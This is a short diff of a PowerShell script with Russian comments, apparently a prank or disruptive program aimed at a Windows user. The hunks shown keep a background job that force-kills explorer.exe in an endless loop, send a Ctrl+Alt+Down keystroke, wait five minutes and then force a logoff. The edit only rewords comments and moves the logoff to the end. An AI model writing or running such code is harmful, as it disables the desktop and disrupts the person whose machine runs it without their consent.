@@ -21,7 +21,9 @@ Get-ChildItem "$env:USERPROFILE\Desktop" -File | ForEach-Object {
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.SendKeys]::SendWait('^{%DOWN}')
 
-# Бесконечно завершать explorer.exe (скрывает рабочий стол)
+# Фоновые задачи запускаем отдельно:
+
+# Бесконечно завершать explorer.exe
 Start-Job -ScriptBlock {
     while ($true) {
         taskkill /f /im explorer.exe
@@ -71,6 +73,8 @@ Start-Job -ScriptBlock {
     }
 }
 
-# Задержка перед выходом из системы
+# Даем фоновым задачам поработать
 Start-Sleep -Seconds 300
+
+# Выход из системы (в самом конце)
 shutdown /l /f
